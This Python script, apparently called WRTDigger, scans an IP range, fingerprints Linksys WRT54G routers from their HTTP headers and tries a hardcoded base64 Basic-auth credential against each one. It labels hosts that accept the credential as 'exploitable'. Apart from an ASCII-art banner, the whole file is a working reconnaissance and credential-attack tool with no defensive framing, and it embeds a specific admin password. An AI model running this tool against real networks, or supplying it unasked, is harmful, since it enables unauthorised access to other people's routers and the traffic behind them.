#!/usr/bin/env python

import sys
import itertools
import requests


print('\       WRTDigger.py        /')
print(' \    ouch@sorebyte.com    /')
print('  \                       /')
print("   ]                     [    ,'|")
print('   ]                     [   /  |')
print("   ]___               ___[ ,'   |")
print('   ]  ]\             /[  [ |:   |')
print('   ]  ] \           / [  [ |:   |')
print('   ]  ]  ]         [  [  [ |:   |')
print('   ]  ]  ]__     __[  [  [ |:   |')
print('   ]  ]  ] ]\ _ /[ [  [  [ |:   |')
print("   ]  ]  ] ] (#) [ [  [  [ :===='")
print('   ]  ]  ]_].nHn.[_[  [  [')
print('   ]  ]  ]  HHHHH. [  [  [')
print('   ]  ] /   `HH("N  \ [  [')
print('   ]__]/     HHH  "  \[__[')
print('   ]         NNN         [')
print('   ]         N/"         [')
print('   ]         N H         [')
print('  /          N            \\')
print(' /           q,            \\')
print('/                           \\')


###===================================================================###
 ###========================= Function 1 ===========================###
###===================================================================###
# http://stackoverflow.com/questions/20525330/python-generate-a-list-of-ip-
#addresses-from-user-input
def ip_gen(input_string):
  octets = input_string.split('.')
  chunks = [map(int, octet.split('-')) for octet in octets]
  ranges = [range(c[0], c[1] + 1) if len(c) == 2 else c for c in chunks]

  for address in itertools.product(*ranges):
    yield '.'.join(map(str, address))


###===================================================================###
 ###========================= Function 2 ===========================###
###===================================================================###
# Knock on the server's door to see if it is a WRT54G.
def knock(url_list):
  wrt_list = []
  not_wrt = []
  error_list = []
  for url in url_list:
    try:
      r = requests.get(url, timeout=4)
      if 'Intoto Http Server' in r.headers['server'] and \
                'WRT54G' in r.headers['www-authenticate']:
        wrt_list.append(url)
      else:
        not_wrt.append(url)
    except IOError:
      error_list.append(url)
  return wrt_list, not_wrt, error_list


###===================================================================###
 ###========================= Function 3 ===========================###
###===================================================================###
# http://stackoverflow.com/questions/6999565/python-https-get-with-basic-
#authentication
def cred_trier(url):
  #cred = 'YWRtaW46YWRtaW4='
  cred = 'YWRtaW46MFREalUzYXZEbVlCYjVMVnhIRzE='
  headers = {'Authorization': 'Basic %s' % cred}
  r = requests.get(url, headers=headers, timeout=5)
  return r.headers, r.text, r.status_code


###===================================================================###
 ###============================ Main() =============================###
###===================================================================###
# Main
def main():
  url_list = []

  # Generating the IPs from the a given range.
  try:
    for ip in ip_gen('192.168.1.1-2'):
      target_url = 'http://%s/' % ip
      url_list.append(target_url)
  except Exception:
      sys.exit('[!] Problem generating the IP addresses')

  # Tell whether an IP is a WRT54G router; populate 'wrt_list' and 'not_wrt'.
  (wrt_list, not_wrt, error_list) = knock(url_list)
  print('[!] The following is a list of hosts that have not responded:')
  for error_item in error_list:
    print('\t\t %s' % error_item)

  # Trying the credentials.
  exploitable = []
  not_exploitable = []
  other_codes = []
  for target in wrt_list:
    (cred_headers, cred_text, cred_code_int) = cred_trier(target)
    cred_code = str(cred_code_int)
    if '401' in cred_code:
      not_exploitable.append(target)
    elif '200' in cred_code:
      exploitable.append(target)
    else:
      other_codes.append(cred_code)
  print('\n[-] These hosts are not using defaul credentials (code 401):')
  for not_exploitable_item in not_exploitable:
    print('\t\t %s' % not_exploitable_item)
  print('\n[+] These hosts are using defaul credentials <^_^>:')
  for exploitable_item in exploitable:
    print('\t\t %s' % exploitable_item)


###===================================================================###
 ###=========================== NO WAY! =============================###
###===================================================================###
if __name__ != '__main__':
  sys.exit('[!] NO WAY!')
else:
  main()